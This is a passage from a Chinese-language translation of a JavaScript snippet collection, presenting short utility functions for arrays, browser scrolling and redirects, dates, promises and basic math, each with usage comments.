扩展运算符去获取数组中的最小值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayMin = <span class="function"><span class="params">arr</span> =&gt;</span> <span class="built_in">Math</span>.min(...arr);</span><br><span class="line"><span class="comment">// arrayMin([10, 1, 5]) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Group-by-条件分组"><a href="#Group-by-条件分组" class="headerlink" title="Group by (条件分组)"></a>Group by (条件分组)</h3><p>使用 <code>Array.map()</code> 将数组的值映射到函数或属性名称。<br>使用 <code>Array.reduce()</code> 创建一个对象，其中的键是从映射的结果中产生的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> groupBy = <span class="function">(<span class="params">arr, func</span>) =&gt;</span></span><br><span class="line">  arr.map(<span class="keyword">typeof</span> func === <span class="string">'function'</span> ? func : <span class="function"><span class="params">val</span> =&gt;</span> val[func])</span><br><span class="line">    .reduce(<span class="function">(<span class="params">acc, val, i</span>) =&gt;</span> &#123; acc[val] = (acc[val] || []).concat(arr[i]); <span class="keyword">return</span> acc; &#125;, &#123;&#125;);</span><br><span class="line"><span class="comment">// groupBy([6.1, 4.2, 6.3], Math.floor) -&gt; &#123;4: [4.2], 6: [6.1, 6.3]&#125;</span></span><br><span class="line"><span class="comment">// groupBy(['one', 'two', 'three'], 'length') -&gt; &#123;3: ['one', 'two'], 5: ['three']&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Head-of-list-获取数组的首个元素"><a href="#Head-of-list-获取数组的首个元素" class="headerlink" title="Head of list (获取数组的首个元素)"></a>Head of list (获取数组的首个元素)</h3><p>使用 <code>arr[0]</code> 返回传递数组的第一个元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> head = <span class="function"><span class="params">arr</span> =&gt;</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// head([1,2,3]) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Initial-of-list"><a href="#Initial-of-list" class="headerlink" title="Initial of list"></a>Initial of list</h3><p>使用 <code>arr,slice(0, -1)</code> 去返回去除最后一个元素的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initial = <span class="function"><span class="params">arr</span> =&gt;</span> arr.slice(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// initial([1,2,3]) -&gt; [1,2]</span></span><br></pre></td></tr></table></figure><h3 id="Initialize-array-with-range-使用指定范围来定义数组"><a href="#Initialize-array-with-range-使用指定范围来定义数组" class="headerlink" title="Initialize array with range (使用指定范围来定义数组)"></a>Initialize array with range (使用指定范围来定义数组)</h3><p>使用 <code>Array(end-start)</code> 创建一个所需长度的数组，使用 <code>Array.map()</code> 来填充范围中的所需值。<br>你可以省略<code>start</code>，默认值为 <code>0</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initializeArrayRange = <span class="function">(<span class="params">end, start = <span class="number">0</span></span>) =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>.apply(<span class="literal">null</span>, <span class="built_in">Array</span>(end - start)).map(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i + start);</span><br><span class="line"><span class="comment">// initializeArrayRange(5) -&gt; [0,1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Initialize-array-with-values-使用指定值来定义数组"><a href="#Initialize-array-with-values-使用指定值来定义数组" class="headerlink" title="Initialize array with values (使用指定值来定义数组)"></a>Initialize array with values (使用指定值来定义数组)</h3><p>使用 <code>Array(n)</code> 创建一个所需长度的数组，使用 <code>fill(v)</code> 去填充所需要的值。<br>亦可以省略 <code>value</code>，默认值为 <code>0</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initializeArray = <span class="function">(<span class="params">n, value = <span class="number">0</span></span>) =&gt;</span> <span class="built_in">Array</span>(n).fill(value);</span><br><span class="line"><span class="comment">// initializeArray(5, 2) -&gt; [2,2,2,2,2]</span></span><br></pre></td></tr></table></figure><h3 id="Last-of-list-获取数组的结尾"><a href="#Last-of-list-获取数组的结尾" class="headerlink" title="Last of list (获取数组的结尾)"></a>Last of list (获取数组的结尾)</h3><p>使用 <code>arr.slice(-1)[0]</code> 获得给定数组的最后一个元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> last = <span class="function"><span class="params">arr</span> =&gt;</span> arr.slice(<span class="number">-1</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// last([1,2,3]) -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="Median-of-array-of-numbers-获取数组的中间值"><a href="#Median-of-array-of-numbers-获取数组的中间值" class="headerlink" title="Median of array of numbers (获取数组的中间值)"></a>Median of array of numbers (获取数组的中间值)</h3><p>找到数组的中间，使用 <code>Array.sort()</code> 对值进行排序。<br>如果长度是奇数，则返回中点处的数字，否则返回两个中间数字的平均值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> median = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>), nums = arr.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">  <span class="keyword">return</span> arr.length % <span class="number">2</span> !== <span class="number">0</span> ? nums[mid] : (nums[mid - <span class="number">1</span>] + nums[mid]) / <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// median([5,6,50,1,-5]) -&gt; 5</span></span><br><span class="line"><span class="comment">// median([0,10,-2,7]) -&gt; 3.5</span></span><br></pre></td></tr></table></figure><h3 id="Nth-element-of-array-获取数组的第-N-个元素"><a href="#Nth-element-of-array-获取数组的第-N-个元素" class="headerlink" title="Nth element of array (获取数组的第 N 个元素)"></a>Nth element of array (获取数组的第 N 个元素)</h3><p>使用 <code>Array.slice()</code> 得到一个包含第一个元素的数组。<br>如果索引超出范围，则返回 <code>[]</code>。（译者注：超过索引返回 <code>undefind</code>）<br>省略第二个参数 <code>n</code> 来获取数组的第一个元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nth = <span class="function">(<span class="params">arr, n=<span class="number">0</span></span>) =&gt;</span> (n&gt;<span class="number">0</span>? arr.slice(n,n+<span class="number">1</span>) : arr.slice(n))[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// nth(['a','b','c'],1) -&gt; 'b'</span></span><br><span class="line"><span class="comment">// nth(['a','b','b']-2) -&gt; 'a'</span></span><br></pre></td></tr></table></figure><h3 id="Pick-挑选"><a href="#Pick-挑选" class="headerlink" title="Pick (挑选)"></a>Pick (挑选)</h3><p>使用 <code>Array.reduce()</code> 去过滤／挑选存在于 obj 中的 key 值，并转换回相应的键值对的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pick = <span class="function">(<span class="params">obj, arr</span>) =&gt;</span></span><br><span class="line">  arr.reduce(<span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr <span class="keyword">in</span> obj &amp;&amp; (acc[curr] = obj[curr]), acc), &#123;&#125;);</span><br><span class="line"><span class="comment">// pick(&#123; 'a': 1, 'b': '2', 'c': 3 &#125;, ['a', 'c']) -&gt; &#123; 'a': 1, 'c': 3 &#125;</span></span><br><span class="line"><span class="comment">// pick(object, ['a', 'c'])['a'] -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Shuffle-array-随机数组"><a href="#Shuffle-array-随机数组" class="headerlink" title="Shuffle array (随机数组)"></a>Shuffle array (随机数组)</h3><p>使用 <code>Array.sort()</code> 在比较器中使用 <code>Math.random()</code> 重新排序元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shuffle = <span class="function"><span class="params">arr</span> =&gt;</span> arr.sort(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span>);</span><br><span class="line"><span class="comment">// shuffle([1,2,3]) -&gt; [2,3,1]</span></span><br></pre></td></tr></table></figure><h3 id="Similarity-between-arrays-获取数组的交集"><a href="#Similarity-between-arrays-获取数组的交集" class="headerlink" title="Similarity between arrays (获取数组的交集)"></a>Similarity between arrays (获取数组的交集)</h3><p>使用 <code>filter()</code> 移除不是 <code>values</code> 的一部分的值，使用 <code>includes()</code> 确定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> similarity = <span class="function">(<span class="params">arr, values</span>) =&gt;</span> arr.filter(<span class="function"><span class="params">v</span> =&gt;</span> values.includes(v));</span><br><span class="line"><span class="comment">// similarity([1,2,3], [1,2,4]) -&gt; [1,2]</span></span><br></pre></td></tr></table></figure><h3 id="Sum-of-array-of-numbers-数组的总和"><a href="#Sum-of-array-of-numbers-数组的总和" class="headerlink" title="Sum of array of numbers (数组的总和)"></a>Sum of array of numbers (数组的总和)</h3><p>使用 <code>Array.reduce()</code> 去迭代值并计算累计器，初始值为 <code>0</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// sum([1,2,3,4]) -&gt; 10</span></span><br></pre></td></tr></table></figure><h3 id="Tail-of-list-列表的尾巴"><a href="#Tail-of-list-列表的尾巴" class="headerlink" title="Tail of list (列表的尾巴)"></a>Tail of list (列表的尾巴)</h3><p>如果数组的长度大于1，则返回 <code>arr.slice(1)</code>，否则返回整个数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tail = <span class="function"><span class="params">arr</span> =&gt;</span> arr.length &gt; <span class="number">1</span> ? arr.slice(<span class="number">1</span>) : arr;</span><br><span class="line"><span class="comment">// tail([1,2,3]) -&gt; [2,3]</span></span><br><span class="line"><span class="comment">// tail([1]) -&gt; [1]</span></span><br></pre></td></tr></table></figure><h3 id="Take-抽取"><a href="#Take-抽取" class="headerlink" title="Take (抽取)"></a>Take (抽取)</h3><p>使用 <code>Array.slice()</code> 从头开始创建 <code>n</code> 个元素的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> take = <span class="function">(<span class="params">arr, n = <span class="number">1</span></span>) =&gt;</span> arr.slice(<span class="number">0</span>, n);</span><br><span class="line"><span class="comment">// take([1, 2, 3], 5) -&gt; [1, 2, 3]</span></span><br><span class="line"><span class="comment">// take([1, 2, 3], 0) -&gt; []</span></span><br></pre></td></tr></table></figure><h3 id="Unique-values-of-array-数组去重"><a href="#Unique-values-of-array-数组去重" class="headerlink" title="Unique values of array (数组去重)"></a>Unique values of array (数组去重)</h3><p>使用ES6 <code>Set</code> 和 <code>...rest</code> 运算符去除所有重复的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unique = <span class="function"><span class="params">arr</span> =&gt;</span> [...new <span class="built_in">Set</span>(arr)];</span><br><span class="line"><span class="comment">// unique([1,2,2,3,4,4,5]) -&gt; [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h2 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h2><h3 id="Bottom-visible-底部可见即滚动至底部"><a href="#Bottom-visible-底部可见即滚动至底部" class="headerlink" title="Bottom visible (底部可见即滚动至底部)"></a>Bottom visible (底部可见即滚动至底部)</h3><p>使用 <code>scrollY</code>，<code>scrollHeight</code> 和 <code>clientHeight</code> 来确定页面的底部是否可见。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bottomVisible = <span class="function"><span class="params">_</span> =&gt;</span></span><br><span class="line">  <span class="built_in">document</span>.documentElement.clientHeight + <span class="built_in">window</span>.scrollY &gt;= (<span class="built_in">document</span>.documentElement.scrollHeight || <span class="built_in">document</span>.documentElement.clientHeight);</span><br><span class="line"><span class="comment">// bottomVisible() -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Current-URL-当前链接地址"><a href="#Current-URL-当前链接地址" class="headerlink" title="Current URL (当前链接地址)"></a>Current URL (当前链接地址)</h3><p>使用 <code>window.location.href</code> 来获取当前链接地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentUrl = <span class="function"><span class="params">_</span> =&gt;</span> <span class="built_in">window</span>.location.href;</span><br><span class="line"><span class="comment">// currentUrl() -&gt; 'https://google.com'</span></span><br></pre></td></tr></table></figure><h3 id="Element-is-visible-in-viewport-元素在视窗中可见"><a href="#Element-is-visible-in-viewport-元素在视窗中可见" class="headerlink" title="Element is visible in viewport (元素在视窗中可见)"></a>Element is visible in viewport (元素在视窗中可见)</h3><p>使用 <code>Element.getBoundingClientRect()</code> 和 <code>window.inner(Width|Height)</code> 值来确定给定的元素在视口中是否可见。<br>第二个参数用来指定元素是否要求完全可见，指定 <code>true</code> 即部分可见，默认为全部可见。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> elementIsVisibleInViewport = <span class="function">(<span class="params">el, partiallyVisible = <span class="literal">false</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; top, left, bottom, right &#125; = el.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">return</span> partiallyVisible</span><br><span class="line">    ? ((top &gt; <span class="number">0</span> &amp;&amp; top &lt; innerHeight) || (bottom &gt; <span class="number">0</span> &amp;&amp; bottom &lt; innerHeight)) &amp;&amp;</span><br><span class="line">      ((left &gt; <span class="number">0</span> &amp;&amp; left &lt; innerWidth) || (right &gt; <span class="number">0</span> &amp;&amp; right &lt; innerWidth))</span><br><span class="line">    : top &gt;= <span class="number">0</span> &amp;&amp; left &gt;= <span class="number">0</span> &amp;&amp; bottom &lt;= innerHeight &amp;&amp; right &lt;= innerWidth;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// e.g. 100x100 viewport and a 10x10px element at position &#123;top: -1, left: 0, bottom: 9, right: 10&#125;</span></span><br><span class="line"><span class="comment">// elementIsVisibleInViewport(el) -&gt; false (not fully visible)</span></span><br><span class="line"><span class="comment">// elementIsVisibleInViewport(el, true) -&gt; true (partially visible)</span></span><br></pre></td></tr></table></figure><h3 id="Get-scroll-position-获取滚动位置"><a href="#Get-scroll-position-获取滚动位置" class="headerlink" title="Get scroll position (获取滚动位置)"></a>Get scroll position (获取滚动位置)</h3><p>如果存在，使用 <code>pageXOffset</code> 和 <code>pageYOffset</code>，否则使用 <code>scrollLeft</code> 和 <code>scrollTop</code>。<br>你可以省略 <code>el</code>，默认使用 <code>window</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getScrollPos = <span class="function">(<span class="params">el = <span class="built_in">window</span></span>) =&gt;</span></span><br><span class="line">  (&#123;<span class="attr">x</span>: (el.pageXOffset !== <span class="literal">undefined</span>) ? el.pageXOffset : el.scrollLeft,</span><br><span class="line">    y: (el.pageYOffset !== <span class="literal">undefined</span>) ? el.pageYOffset : el.scrollTop&#125;);</span><br><span class="line"><span class="comment">// getScrollPos() -&gt; &#123;x: 0, y: 200&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Redirect-to-URL-URL-重定向"><a href="#Redirect-to-URL-URL-重定向" class="headerlink" title="Redirect to URL (URL 重定向)"></a>Redirect to URL (URL 重定向)</h3><p>使用 <code>window.location.href</code> 或者 <code>window.location.replace()</code> 去重定向到 <code>url</code>。<br>第二个参数用来控制模拟链接点击（<code>true</code> - 默认）还是 HTTP 重定向（<code>false</code>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redirect = <span class="function">(<span class="params">url, asLink = <span class="literal">true</span></span>) =&gt;</span></span><br><span class="line">  asLink ? <span class="built_in">window</span>.location.href = url : <span class="built_in">window</span>.location.replace(url);</span><br><span class="line"><span class="comment">// redirect('https://google.com')</span></span><br></pre></td></tr></table></figure><h3 id="Scroll-to-top-滚动至顶部"><a href="#Scroll-to-top-滚动至顶部" class="headerlink" title="Scroll to top (滚动至顶部)"></a>Scroll to top (滚动至顶部)</h3><p>使用 <code>document.documentElement.scrollTop</code> 或 <code>document.body.scrollTop</code> 获取到顶端的距离。<br>从顶部滚动一小部分距离。 使用 <code>window.requestAnimationFrame（）</code> 实现滚动动画。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> scrollToTop = <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> c = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">  <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(scrollToTop);</span><br><span class="line">    <span class="built_in">window</span>.scrollTo(<span class="number">0</span>, c - c / <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// scrollToTop()</span></span><br></pre></td></tr></table></figure><h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><h3 id="Get-days-difference-between-dates-获取两个日期间的差距"><a href="#Get-days-difference-between-dates-获取两个日期间的差距" class="headerlink" title="Get days difference between dates (获取两个日期间的差距)"></a>Get days difference between dates (获取两个日期间的差距)</h3><p>计算两个 <code>Date</code> 对象之间的差距（以天为单位）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getDaysDiffBetweenDates = <span class="function">(<span class="params">dateInitial, dateFinal</span>) =&gt;</span> (dateFinal - dateInitial) / (<span class="number">1000</span> * <span class="number">3600</span> * <span class="number">24</span>);</span><br><span class="line"><span class="comment">// getDaysDiffBetweenDates(new Date("2017-12-13"), new Date("2017-12-22")) -&gt; 9</span></span><br></pre></td></tr></table></figure><h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><h3 id="Chain-asynchronous-functions-链式异步函数"><a href="#Chain-asynchronous-functions-链式异步函数" class="headerlink" title="Chain asynchronous functions (链式异步函数)"></a>Chain asynchronous functions (链式异步函数)</h3><p>循环遍历包含异步事件的函数数组，当每个异步事件完成时调用 <code>next</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chainAsync = <span class="function"><span class="params">fns</span> =&gt;</span> &#123; <span class="keyword">let</span> curr = <span class="number">0</span>; <span class="keyword">const</span> next = <span class="function"><span class="params">()</span> =&gt;</span> fns[curr++](next); next(); &#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chainAsync([</span></span><br><span class="line"><span class="comment">  next =&gt; &#123; console.log('0 seconds'); setTimeout(next, 1000); &#125;,</span></span><br><span class="line"><span class="comment">  next =&gt; &#123; console.log('1 second');  setTimeout(next, 1000); &#125;,</span></span><br><span class="line"><span class="comment">  next =&gt; &#123; console.log('2 seconds'); &#125;</span></span><br><span class="line"><span class="comment">])</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="Curry-函数柯里化"><a href="#Curry-函数柯里化" class="headerlink" title="Curry (函数柯里化)"></a>Curry (函数柯里化)</h3><p>使用递归。<br>如果提供的参数（<code>args</code>）的数量足够，则调用传递的函数 <code>fn</code>，否则返回一个柯里化函数 <code>fn</code>，等待传入剩下的参数。<br>如果你想要一个接受参数数量可变的函数（一个可变参数函数，例如<code>Math.min()</code>），你可以选择将参数个数传递给第二个参数 <code>arity</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> curry = <span class="function">(<span class="params">fn, arity = fn.length, ...args</span>) =&gt;</span></span><br><span class="line">  arity &lt;= args.length</span><br><span class="line">    ? fn(...args)</span><br><span class="line">    : curry.bind(<span class="literal">null</span>, fn, arity, ...args);</span><br><span class="line"><span class="comment">// curry(Math.pow)(2)(10) -&gt; 1024</span></span><br><span class="line"><span class="comment">// curry(Math.min, 3)(10)(50)(2) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Pipe-管道"><a href="#Pipe-管道" class="headerlink" title="Pipe (管道)"></a>Pipe (管道)</h3><p>使用 <code>Array.reduce()</code> 让值在函数间流通。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pipe = <span class="function">(<span class="params">...funcs</span>) =&gt;</span> arg =&gt; funcs.reduce(<span class="function">(<span class="params">acc, func</span>) =&gt;</span> func(acc), arg);</span><br><span class="line"><span class="comment">// pipe(btoa, x =&gt; x.toUpperCase())("Test") -&gt; "VGVZDA=="</span></span><br></pre></td></tr></table></figure><h3 id="Promisify-promise转化"><a href="#Promisify-promise转化" class="headerlink" title="Promisify (promise转化)"></a>Promisify (promise转化)</h3><p>使用 currying 返回一个函数，返回一个调用原始函数的 <code>Promise</code>。<br>使用 <code>...rest</code> 运算符传入所有参数。</p><p><em>In Node 8+, you can use <a href="https://nodejs.org/api/util.html#util_util_promisify_original" target="_blank" rel="noopener"><code>util.promisify</code></a></em></p><p><em>Node 8 版本以上，你可以使用 <a href="https://nodejs.org/api/util.html#util_util_promisify_original" target="_blank" rel="noopener"><code>util.promisify</code></a></em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promisify = <span class="function"><span class="params">func</span> =&gt;</span></span><br><span class="line">  (...args) =&gt;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span></span><br><span class="line">      func(...args, (err, result) =&gt;</span><br><span class="line">        err ? reject(err) : resolve(result))</span><br><span class="line">    );</span><br><span class="line"><span class="comment">// const delay = promisify((d, cb) =&gt; setTimeout(cb, d))</span></span><br><span class="line"><span class="comment">// delay(2000).then(() =&gt; console.log('Hi!')) -&gt; Promise resolves after 2s</span></span><br></pre></td></tr></table></figure><h3 id="Run-promises-in-series-队列运行promise"><a href="#Run-promises-in-series-队列运行promise" class="headerlink" title="Run promises in series (队列运行promise)"></a>Run promises in series (队列运行promise)</h3><p>使用 <code>Array.reduce()</code> 通过创建一个 promise 链来运行一系列 promise，每个 promise 在解析时返回下一个 promise。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> series = <span class="function"><span class="params">ps</span> =&gt;</span> ps.reduce(<span class="function">(<span class="params">p, next</span>) =&gt;</span> p.then(next), <span class="built_in">Promise</span>.resolve());</span><br><span class="line"><span class="comment">// const delay = (d) =&gt; new Promise(r =&gt; setTimeout(r, d))</span></span><br><span class="line"><span class="comment">// series([() =&gt; delay(1000), () =&gt; delay(2000)]) -&gt; executes each promise sequentially, taking a total of 3 seconds to complete</span></span><br></pre></td></tr></table></figure><h3 id="Sleep-睡眠"><a href="#Sleep-睡眠" class="headerlink" title="Sleep (睡眠)"></a>Sleep (睡眠)</h3><p>通过返回一个 <code>Promise</code> 延迟执行 <code>async</code> 函数，把它放到睡眠状态。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sleep = <span class="function"><span class="params">ms</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> setTimeout(resolve, ms));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">async function sleepyWork() &#123;</span></span><br><span class="line"><span class="comment">  console.log('I\'m going to sleep for 1 second.');</span></span><br><span class="line"><span class="comment">  await sleep(1000);</span></span><br><span class="line"><span class="comment">  console.log('I woke up after 1 second.');</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Collatz-algorithm-考拉兹算法"><a href="#Collatz-algorithm-考拉兹算法" class="headerlink" title="Collatz algorithm (考拉兹算法)"></a>Collatz algorithm (考拉兹算法)</h3><p>如果 <code>n</code> 是偶数，返回 <code>n/2</code>，否则返回 <code>3n+1</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> collatz = <span class="function"><span class="params">n</span> =&gt;</span> (n % <span class="number">2</span> == <span class="number">0</span>) ? (n / <span class="number">2</span>) : (<span class="number">3</span> * n + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// collatz(8) --&gt; 4</span></span><br><span class="line"><span class="comment">// collatz(5) --&gt; 16</span></span><br></pre></td></tr></table></figure><h3 id="Distance-between-two-points-两点间的距离"><a href="#Distance-between-two-points-两点间的距离" class="headerlink" title="Distance between two points (两点间的距离)"></a>Distance between two points (两点间的距离)</h3><p>使用 <code>Matg.hypot()</code> 来计算两点间的欧式距离。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> distance = <span class="function">(<span class="params">x0, y0, x1, y1</span>) =&gt;</span> <span class="built_in">Math</span>.hypot(x1 - x0, y1 - y0);</span><br><span class="line"><span class="comment">// distance(1,1, 2,3) -&gt; 2.23606797749979</span></span><br></pre></td></tr></table></figure><h3 id="Divisible-by-number-可否被整除"><a href="#Divisible-by-number-可否被整除" class="headerlink" title="Divisible by number (可否被整除)"></a>Divisible by number (可否被整除)</h3><p>使用模运算符（<code>％</code>）来检查余数是否等于 <code>0</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isDivisible = <span class="function">(<span class="params">dividend, divisor</span>) =&gt;</span> dividend % divisor === <span class="number">0</span>;</span><br><span class="line"><span class="comment">// isDivisible(6,3) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Even-or-odd-number-偶数或奇数"><a href="#Even-or-odd-number-偶数或奇数" class="headerlink" title="Even or odd number (偶数或奇数)"></a>Even or odd number (偶数或奇数)</h3><p>使用模运算符（<code>%</code>）来计算一个数为偶数还是奇数。<br>返回 <code>true</code> 为偶数，返回 